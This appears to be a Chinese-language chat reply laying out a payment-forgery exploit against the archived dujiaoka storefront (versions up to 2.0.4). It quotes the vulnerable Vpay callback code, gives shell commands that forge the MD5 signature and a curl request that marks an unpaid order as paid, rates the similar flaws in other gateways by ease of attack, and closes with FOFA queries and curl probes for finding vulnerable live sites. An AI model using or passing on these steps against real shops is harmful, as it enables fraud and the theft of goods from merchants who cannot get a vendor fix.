代码都扒出来了。这个漏洞确实经典，整理清楚：

---

🐛 独角数卡 · PHP 伪造支付漏洞

漏洞本质

支付回调接口签名算法可逆向，攻击者能自己算签名 → 伪造支付成功通知 → 订单状态变为「已支付」→ 无需真实付款即可获得商品。

受影响版本

dujiaoka ≤ 2.0.4（含）所有版本。项目已归档，不会修复。

漏洞根因

以 V免签 (Vpay) 为例——最易利用的一个：

// app/Http/Controllers/Pay/VpayController.php
public function notifyUrl(Request $request)  // ← GET 请求！
{
    $data = $request->all();  // 直接取所有参数，无任何来源校验
    
    $key = $payGateway->merchant_id;  // ← 密钥就是 merchant_id！
    $sign = md5($payId . $param . $type . $price . $reallyPrice . $key);
    //      ↑ 攻击者知道 merchant_id → 可以自己算签名
    
    if ($_sign != $sign) {
        return 'fail';
    }
    // 签名通过 → 订单完成
    $this->orderProcessService->completedOrder($param, $price, $payId);
}


致命问题拆解

**GET 请求**
• 说明: Route::get('vpay/notify_url', ...) — 浏览器直接访问即可

**密钥公开**
• 说明: 签名密钥 = merchant_id，存在数据库 pay 表，配置页面可见

**无 IP 白名单**
• 说明: 任何 IP 都能调

**无重放保护**
• 说明: 同一签名可无限次使用

**参数完全可控**
• 说明: payId/param/type/price/reallyPrice 全部由攻击者构造

利用步骤

# 1. 先正常创建一个订单（下任意商品，选择 V免签 支付）
# 拿到 order_sn，比如 "2024010112345678"

# 2. 获取 merchant_id（两种方式）
#    方式A: 如果目标开启了 debug 模式，报错页直接泄露
#    方式B: 自己注册个商户对接 V免签，merchant_id 就是你的商户号

# 3. 构造参数 + 计算签名
order_sn="2024010112345678"
payId="202401019999"            # 随意
price="0.01"                     # 金额（必须≥订单金额）
reallyPrice="0.01"               # 实付金额
type="1"                         # 1=微信 2=支付宝
merchant_id="12345"              # 商户号

# md5(payId + param + type + price + reallyPrice + merchant_id)
sign=$(echo -n "${payId}${order_sn}${type}${price}${reallyPrice}${merchant_id}" | md5sum | cut -d' ' -f1)

# 4. 直接 GET 请求触发
curl "https://target.com/pay/vpay/notify_url?payId=${payId}&param=${order_sn}&type=${type}&price=${price}&reallyPrice=${reallyPrice}&sign=${sign}"
# 返回 "success" → 订单已标记为已支付！


其他支付方式的同款问题

V免签
• 请求方法: GET
• 签名密钥: merchant_id（公开）
• 难度: ⭐️ 极低

易支付
• 请求方法: GET
• 签名密钥: merchant_pem（配置中）
• 难度: ⭐️⭐️ 低

码支付
• 请求方法: POST
• 签名密钥: merchant_id
• 难度: ⭐️⭐️ 低

Paysapi
• 请求方法: POST
• 签名密钥: merchant_pem
• 难度: ⭐️⭐️ 低

TokenPay(USDT)
• 请求方法: POST
• 签名密钥: merchant_key
• 难度: ⭐️⭐️ 低

EPUSDT(USDT)
• 请求方法: POST
• 签名密钥: merchant_key
• 难度: ⭐️⭐️ 低

怎么找目标

# FOFA
app="独角数卡"
body="dujiaoka"

# 直接找 V免签 notify 端点
curl https://target.com/pay/vpay/notify_url
# 返回 "fail" 说明端点存在 ← 确认是 dujiaoka

# 易支付 notify 端点（也是 GET）
curl "https://target.com/pay/yipay/notify_url?out_trade_no=test"
# 返回 "fail" 确认存在


---